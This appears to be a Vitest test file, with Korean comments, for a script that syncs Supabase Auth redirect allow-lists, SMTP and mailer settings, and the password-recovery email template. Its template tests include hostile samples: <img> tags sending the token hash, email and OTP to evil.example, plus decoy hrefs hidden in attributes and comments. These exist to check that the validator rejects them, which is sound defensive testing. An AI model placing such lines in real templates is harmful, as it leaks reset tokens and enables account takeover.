import { afterEach, describe, expect, it, vi } from 'vitest';
import { readFile } from 'node:fs/promises';

import {
  isSatisfied,
  isSafeRecoveryTemplate,
  syncSupabaseAuth,
  mailerPatch,
  missingSmtpSettings,
  parseAllowList,
  resolveRedirectAllowList,
} from './sync-supabase-auth.mjs';

afterEach(() => { vi.unstubAllGlobals(); });

describe('parseAllowList', () => {
  it('Supabase가 돌려주는 콤마 목록을 항목 배열로 만든다', () => {
    expect(parseAllowList('https://a/cb, https://b/cb ,,https://c/cb'))
      .toEqual(['https://a/cb', 'https://b/cb', 'https://c/cb']);
  });

  it('빈 값과 null은 빈 배열이다', () => {
    expect(parseAllowList('')).toEqual([]);
    expect(parseAllowList(null)).toEqual([]);
    expect(parseAllowList(undefined)).toEqual([]);
  });
});

describe('repository Auth redirect contract', () => {
  it('declares dedicated recovery callbacks for local, preview, and production', async () => {
    const [localConfig, pipeline, recoveryTemplate] = await Promise.all([
      readFile(new URL('../supabase/config.toml', import.meta.url), 'utf8'),
      readFile(new URL('../.github/workflows/pipeline.yml', import.meta.url), 'utf8'),
      readFile(new URL('../supabase/templates/recovery.html', import.meta.url), 'utf8'),
    ]);

    expect(localConfig).toContain('http://localhost:3000/auth/recovery/callback');
    expect(localConfig).toContain('http://127.0.0.1:3000/auth/recovery/callback');
    expect(pipeline).toContain('https://iconsip.com/auth/recovery/callback');
    expect(pipeline).toContain('https://www.iconsip.com/auth/recovery/callback');
    expect(pipeline).toContain('https://icons-ip.vercel.app/auth/recovery/callback');
    expect(pipeline).toContain('https://icons-*-sangwopark19icons-1055s-projects.vercel.app/auth/recovery/callback');
    expect(pipeline).toContain('https://icons-git-*-sangwopark19icons-1055s-projects.vercel.app/auth/recovery/callback');
    expect(localConfig).toContain('[auth.email.template.recovery]');
    expect(localConfig).toContain('content_path = "./supabase/templates/recovery.html"');
    expect(localConfig).toContain('otp_expiry = 3600');
    expect(pipeline.match(/RECOVERY_TEMPLATE_PATH: supabase\/templates\/recovery\.html/g)).toHaveLength(1);
    expect(pipeline.match(/EMAIL_OTP_EXPIRY_SECONDS: "3600"/g)).toHaveLength(2);
    expect(isSafeRecoveryTemplate(recoveryTemplate)).toBe(true);

    const productionDeploy = pipeline.indexOf('- name: Deploy Vercel production');
    const productionTemplate = pipeline.indexOf(
      '- name: Activate recovery token-hash template in production',
    );
    expect(pipeline).not.toContain('Activate recovery token-hash template in preview');
    expect(productionDeploy).toBeGreaterThan(-1);
    expect(productionTemplate).toBeGreaterThan(productionDeploy);

    const productionJob = pipeline.slice(pipeline.indexOf('  deploy-vercel:'));
    const productionJobEnv = productionJob.slice(
      productionJob.indexOf('    env:'),
      productionJob.indexOf('\n\n    steps:'),
    );
    expect(productionJobEnv).not.toContain('SUPABASE_ACCESS_TOKEN');
    expect(productionJob.match(/SUPABASE_ACCESS_TOKEN: \$\{\{ secrets\.SUPABASE_ACCESS_TOKEN \}\}/g))
      .toHaveLength(2);
  });
});

describe('recovery email template contract', () => {
  it('requires the dedicated callback with token hash and recovery type', () => {
    expect(isSafeRecoveryTemplate(
      '<a href="{{ .RedirectTo }}?token_hash={{ .TokenHash }}&type=recovery">reset</a>',
    )).toBe(true);
    expect(isSafeRecoveryTemplate('<a href="{{ .ConfirmationURL }}">reset</a>')).toBe(false);
    expect(isSafeRecoveryTemplate(
      '<a href="{{ .RedirectTo }}?token_hash={{ .TokenHash }}&type=signup">reset</a>',
    )).toBe(false);
    expect(isSafeRecoveryTemplate('<a href="{{ .SiteURL }}/auth/callback">reset</a>')).toBe(false);
    expect(isSafeRecoveryTemplate('<a href="https://iconsip.com/auth/callback">reset</a>')).toBe(false);
    expect(isSafeRecoveryTemplate(
      '<p>{{ .RedirectTo }}</p><a href="https://evil.example/reset?token_hash={{ .TokenHash }}&type=recovery">reset</a>',
    )).toBe(false);
    expect(isSafeRecoveryTemplate(
      '<a href="{{ .RedirectTo }}?token_hash={{ .TokenHash }}&type=recovery">reset</a>'
      + '<img src="https://evil.example/collect?token_hash={{ .TokenHash }}">',
    )).toBe(false);
    expect(isSafeRecoveryTemplate(
      '<a href="{{ .redirectto }}?token_hash={{ .tokenhash }}&type=recovery">reset</a>',
    )).toBe(false);
    expect(isSafeRecoveryTemplate(
      '<p data-href="{{ .RedirectTo }}?token_hash={{ .TokenHash }}&type=recovery">reset</p>',
    )).toBe(false);
    expect(isSafeRecoveryTemplate(
      '<a title="decoy href=\'{{ .RedirectTo }}?token_hash={{ .TokenHash }}&type=recovery\'">reset</a>',
    )).toBe(false);
    expect(isSafeRecoveryTemplate(
      '<a <!-- href="{{ .RedirectTo }}?token_hash={{ .TokenHash }}&type=recovery" -->>reset</a>',
    )).toBe(false);
    expect(isSafeRecoveryTemplate(
      '<a href="{{ .RedirectTo }}?token_hash={{ .TokenHash }}&type=recovery">reset</a>'
      + '<img src="https://evil.example/collect?email={{ .Email }}&otp={{ .Token }}">',
    )).toBe(false);
  });
});

describe('resolveRedirectAllowList', () => {
  it('없는 필수 항목만 더하고 기존 순서를 보존한다', () => {
    const result = resolveRedirectAllowList({
      current: 'https://iconsip.com/auth/callback,https://extra.example/cb',
      required: ['https://iconsip.com/auth/callback', 'https://www.iconsip.com/auth/callback'],
    });

    expect(result.list).toBe([
      'https://iconsip.com/auth/callback',
      'https://extra.example/cb',
      'https://www.iconsip.com/auth/callback',
    ].join(','));
    expect(result.added).toEqual(['https://www.iconsip.com/auth/callback']);
    expect(result.removed).toEqual([]);
    expect(result.changed).toBe(true);
  });

  it('이미 다 있으면 바꾸지 않는다', () => {
    const current = 'https://iconsip.com/auth/callback,https://www.iconsip.com/auth/callback';
    const result = resolveRedirectAllowList({
      current,
      required: ['https://www.iconsip.com/auth/callback', 'https://iconsip.com/auth/callback'],
    });

    expect(result.changed).toBe(false);
    expect(result.list).toBe(current);
  });

  /*
   * prune이 이 스크립트의 존재 이유다. Supabase 설정은 한 번 들어간 항목이 남으므로,
   * 목록에서 빼는 것만으로는 이미 저장된 항목이 사라지지 않는다.
   */
  it('prune 목록에 있는 항목을 정확히 일치할 때만 제거한다', () => {
    const result = resolveRedirectAllowList({
      current: [
        'https://iconsip.com/auth/callback',
        'https://icons-ip-*.vercel.app/auth/callback',
        'https://icons-ip.vercel.app/auth/callback',
      ].join(','),
      required: ['https://iconsip.com/auth/callback'],
      prune: ['https://icons-ip-*.vercel.app/auth/callback'],
    });

    expect(result.list).toBe([
      'https://iconsip.com/auth/callback',
      'https://icons-ip.vercel.app/auth/callback',
    ].join(','));
    expect(result.removed).toEqual(['https://icons-ip-*.vercel.app/auth/callback']);
    expect(result.changed).toBe(true);
  });

  it('prune이 접두만 같은 항목을 지우지 않는다', () => {
    const result = resolveRedirectAllowList({
      current: 'https://icons-ip.vercel.app/auth/callback',
      required: [],
      prune: ['https://icons-ip-*.vercel.app/auth/callback'],
    });

    expect(result.list).toBe('https://icons-ip.vercel.app/auth/callback');
    expect(result.removed).toEqual([]);
    expect(result.changed).toBe(false);
  });

  /* 같은 항목이 required와 prune 양쪽에 오면 설정이 모순이다 — 조용히 한쪽을 고르지 않는다. */
  it('required와 prune이 겹치면 던진다', () => {
    expect(() => resolveRedirectAllowList({
      current: '',
      required: ['https://iconsip.com/auth/callback'],
      prune: ['https://iconsip.com/auth/callback'],
    })).toThrow(/both required and pruned/);
  });

  it('중복된 필수 항목을 두 번 넣지 않는다', () => {
    const result = resolveRedirectAllowList({
      current: '',
      required: ['https://a/cb', 'https://a/cb', 'https://b/cb'],
    });

    expect(result.list).toBe('https://a/cb,https://b/cb');
  });
});

describe('missingSmtpSettings', () => {
  const configured = {
    external_email_enabled: true,
    smtp_host: 'smtp.example',
    smtp_port: '587',
    smtp_user: 'mailer',
    smtp_admin_email: 'no-reply@example',
  };

  it('전부 설정된 config는 빈 목록이다', () => {
    expect(missingSmtpSettings(configured)).toEqual([]);
  });

  it('external_email_enabled가 꺼져 있으면 잡아낸다', () => {
    expect(missingSmtpSettings({ ...configured, external_email_enabled: false }))
      .toEqual(['external_email_enabled']);
  });

  it('빈 SMTP 필드를 모두 이름으로 보고한다', () => {
    expect(missingSmtpSettings({ external_email_enabled: true }))
      .toEqual(['smtp_host', 'smtp_port', 'smtp_user', 'smtp_admin_email']);
  });
});

describe('isSatisfied', () => {
  const base = { site_url: 'https://iconsip.com', uri_allow_list: 'https://iconsip.com/auth/callback' };
  const args = { siteUrl: 'https://iconsip.com', allowList: 'https://iconsip.com/auth/callback' };

  it('site_url과 allow-list만 맞으면 mailer 강제 없이 통과한다', () => {
    expect(isSatisfied({ ...args, config: base, enforceMailer: false })).toBe(true);
  });

  it('allow-list가 다르면 통과하지 않는다', () => {
    expect(isSatisfied({ ...args, config: { ...base, uri_allow_list: '' }, enforceMailer: false }))
      .toBe(false);
  });

  /*
   * 갓 만든 프로젝트는 mailer_autoconfirm 키를 아예 돌려주지 않는다. 이 값을 false와
   * 다르다고 보면 PATCH → 확인이 영원히 실패해 배포가 멈춘다.
   */
  it('mailer_autoconfirm이 없는 신규 프로젝트도 강제 모드를 통과한다', () => {
    const config = { ...base, mailer_secure_email_change_enabled: true, rate_limit_email_sent: 30 };
    expect(isSatisfied({ ...args, config, enforceMailer: true })).toBe(true);
  });

  it('mailer_autoconfirm이 켜져 있으면 강제 모드를 통과하지 않는다', () => {
    const config = {
      ...base,
      mailer_autoconfirm: true,
      mailer_secure_email_change_enabled: true,
      rate_limit_email_sent: 30,
    };
    expect(isSatisfied({ ...args, config, enforceMailer: true })).toBe(false);
  });

  it('rate limit이 문자열로 와도 숫자로 비교한다', () => {
    const config = {
      ...base,
      mailer_autoconfirm: false,
      mailer_secure_email_change_enabled: true,
      rate_limit_email_sent: '30',
    };
    expect(isSatisfied({ ...args, config, enforceMailer: true })).toBe(true);
  });

  it('version-controlled recovery template가 다르면 통과하지 않는다', () => {
    const recoveryTemplate = '<a href="{{ .RedirectTo }}?token_hash={{ .TokenHash }}&type=recovery">reset</a>';

    expect(isSatisfied({
      ...args,
      config: { ...base, mailer_templates_recovery_content: recoveryTemplate },
      enforceMailer: false,
      recoveryTemplate,
    })).toBe(true);
    expect(isSatisfied({
      ...args,
      config: { ...base, mailer_templates_recovery_content: '<a href="/old">old</a>' },
      enforceMailer: false,
      recoveryTemplate,
    })).toBe(false);
  });

  it('email link TTL이 선언값과 다르면 통과하지 않는다', () => {
    expect(isSatisfied({
      ...args,
      config: { ...base, mailer_otp_exp: '3600' },
      enforceMailer: false,
      emailOtpExpirySeconds: 3600,
    })).toBe(true);
    expect(isSatisfied({
      ...args,
      config: { ...base, mailer_otp_exp: 7200 },
      enforceMailer: false,
      emailOtpExpirySeconds: 3600,
    })).toBe(false);
  });
});

describe('mailerPatch', () => {
  it('강제하지 않으면 mailer 설정을 건드리지 않는다', () => {
    expect(mailerPatch({ enforceMailer: false })).toEqual({});
  });

  it('강제하면 production 기준값을 담는다', () => {
    expect(mailerPatch({ enforceMailer: true })).toEqual({
      mailer_autoconfirm: false,
      mailer_secure_email_change_enabled: true,
      rate_limit_email_sent: 30,
    });
  });
});

/*
 * production 배포가 이 흐름에 걸려 있다. bash에서 옮겨온 부분이라 read → patch → verify
 * 순서와 실패 조건을 테스트로 고정한다.
 */
describe('syncSupabaseAuth', () => {
  const baseEnv = {
    SUPABASE_ACCESS_TOKEN: 'pat',
    PROJECT_REF: 'projref',
    SITE_URL: 'https://iconsip.com',
    REDIRECT_URLS: 'https://iconsip.com/auth/callback\nhttps://www.iconsip.com/auth/callback',
  };

  function stubFetch(responses) {
    const calls = [];
    const fetchStub = async (url, options = {}) => {
      calls.push({ url, method: options.method ?? 'GET', body: options.body });
      const next = responses.shift();
      if (!next) throw new Error('unexpected extra fetch');
      return { ok: next.ok ?? true, status: next.status ?? 200, json: async () => next.body ?? {} };
    };
    return { calls, fetchStub };
  }

  const ok = (body) => ({ ok: true, status: 200, body });

  it('이미 맞는 설정이면 PATCH하지 않는다', async () => {
    const synced = {
      site_url: 'https://iconsip.com',
      uri_allow_list: 'https://iconsip.com/auth/callback,https://www.iconsip.com/auth/callback',
    };
    const { calls, fetchStub } = stubFetch([ok(synced)]);
    vi.stubGlobal('fetch', fetchStub);

    await expect(syncSupabaseAuth(baseEnv, () => {})).resolves.toEqual({ patched: false });
    expect(calls.map((c) => c.method)).toEqual(['GET']);
  });

  it('부족하면 PATCH하고 확인까지 한다', async () => {
    const after = {
      site_url: 'https://iconsip.com',
      uri_allow_list: 'https://iconsip.com/auth/callback,https://www.iconsip.com/auth/callback',
    };
    const { calls, fetchStub } = stubFetch([
      ok({ site_url: '', uri_allow_list: 'https://iconsip.com/auth/callback' }),
      ok({}),
      ok(after),
    ]);
    vi.stubGlobal('fetch', fetchStub);

    await expect(syncSupabaseAuth(baseEnv, () => {})).resolves.toEqual({ patched: true });
    expect(calls.map((c) => c.method)).toEqual(['GET', 'PATCH', 'GET']);
    expect(JSON.parse(calls[1].body)).toEqual({
      site_url: 'https://iconsip.com',
      uri_allow_list: after.uri_allow_list,
    });
  });

  it('폐기된 redirect를 PATCH 본문에서 실제로 제거한다', async () => {
    const env = { ...baseEnv, PRUNE_REDIRECT_URLS: 'https://icons-ip-*.vercel.app/auth/callback' };
    const current = [
      'https://iconsip.com/auth/callback',
      'https://icons-ip-*.vercel.app/auth/callback',
      'https://www.iconsip.com/auth/callback',
    ].join(',');
    const expected = 'https://iconsip.com/auth/callback,https://www.iconsip.com/auth/callback';
    const { calls, fetchStub } = stubFetch([
      ok({ site_url: 'https://iconsip.com', uri_allow_list: current }),
      ok({}),
      ok({ site_url: 'https://iconsip.com', uri_allow_list: expected }),
    ]);
    vi.stubGlobal('fetch', fetchStub);

    await syncSupabaseAuth(env, () => {});
    expect(JSON.parse(calls[1].body).uri_allow_list).toBe(expected);
  });

  it('version-controlled recovery template를 PATCH하고 read-back으로 검증한다', async () => {
    const recoveryTemplatePath = new URL('../supabase/templates/recovery.html', import.meta.url).pathname;
    const recoveryTemplate = (await readFile(recoveryTemplatePath, 'utf8')).trim();
    const env = { ...baseEnv, RECOVERY_TEMPLATE_PATH: recoveryTemplatePath };
    const allowList = 'https://iconsip.com/auth/callback,https://www.iconsip.com/auth/callback';
    const { calls, fetchStub } = stubFetch([
      ok({ site_url: 'https://iconsip.com', uri_allow_list: allowList, mailer_templates_recovery_content: 'old' }),
      ok({}),
      ok({
        site_url: 'https://iconsip.com',
        uri_allow_list: allowList,
        mailer_templates_recovery_content: recoveryTemplate,
      }),
    ]);
    vi.stubGlobal('fetch', fetchStub);

    await expect(syncSupabaseAuth(env, () => {})).resolves.toEqual({ patched: true });
    expect(JSON.parse(calls[1].body).mailer_templates_recovery_content).toBe(recoveryTemplate);
  });

  it('email link TTL을 PATCH하고 read-back으로 검증한다', async () => {
    const env = { ...baseEnv, EMAIL_OTP_EXPIRY_SECONDS: '3600' };
    const allowList = 'https://iconsip.com/auth/callback,https://www.iconsip.com/auth/callback';
    const { calls, fetchStub } = stubFetch([
      ok({ site_url: 'https://iconsip.com', uri_allow_list: allowList, mailer_otp_exp: 7200 }),
      ok({}),
      ok({ site_url: 'https://iconsip.com', uri_allow_list: allowList, mailer_otp_exp: '3600' }),
    ]);
    vi.stubGlobal('fetch', fetchStub);

    await expect(syncSupabaseAuth(env, () => {})).resolves.toEqual({ patched: true });
    expect(JSON.parse(calls[1].body).mailer_otp_exp).toBe(3600);
  });

  it('SMTP를 요구했는데 없으면 PATCH 전에 던진다', async () => {
    const env = { ...baseEnv, REQUIRE_SMTP: 'true' };
    const { calls, fetchStub } = stubFetch([ok({ site_url: '', uri_allow_list: '' })]);
    vi.stubGlobal('fetch', fetchStub);

    await expect(syncSupabaseAuth(env, () => {})).rejects.toThrow(/custom SMTP is required/);
    expect(calls.map((c) => c.method)).toEqual(['GET']);
  });

  it('설정 읽기가 실패하면 상태 코드를 담아 던진다', async () => {
    const { fetchStub } = stubFetch([{ ok: false, status: 403, body: { message: 'forbidden' } }]);
    vi.stubGlobal('fetch', fetchStub);

    await expect(syncSupabaseAuth(baseEnv, () => {}))
      .rejects.toThrow(/Auth config read failed: HTTP 403 forbidden/);
  });

  it('필수 환경변수가 없으면 네트워크를 타지 않고 던진다', async () => {
    const { calls, fetchStub } = stubFetch([]);
    vi.stubGlobal('fetch', fetchStub);

    await expect(syncSupabaseAuth({}, () => {})).rejects.toThrow('SUPABASE_ACCESS_TOKEN is required');
    expect(calls).toEqual([]);
  });
});
